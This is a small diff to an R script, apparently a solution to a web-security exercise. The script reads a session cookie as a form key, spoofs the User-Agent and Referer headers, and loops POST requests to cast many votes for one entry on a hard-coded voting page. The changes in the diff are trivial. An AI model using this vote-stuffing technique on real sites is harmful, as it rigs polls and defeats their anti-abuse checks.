@@ -17,7 +17,7 @@ library('httr')
 
 url     <- "http://173.246.108.142/level2.php"
 header  <- add_headers("User-Agent" = "Windows NT 5.1 - havk64 R Language Requests", "Referer" = url)
-count   <- 0
+count   <- 0L
 # Get number from user:
 cat("How many votes? => ")
 total   <- as.integer(readLines("stdin", 1))
@@ -25,7 +25,7 @@ total   <- as.integer(readLines("stdin", 1))
 while(count < total) {
     head    <- HEAD(url)            # Head request
     cookie  <- cookies(head)$value
-    cat(cookie[2], "\n")
+    # cat(cookie[2], "\n") # Print the cookie
     body    <- list(id = "23", holdthedoor = "submit", key = cookie[2])
     p       <- POST(url, body = body, encode = "form", header)
     # To print the body:
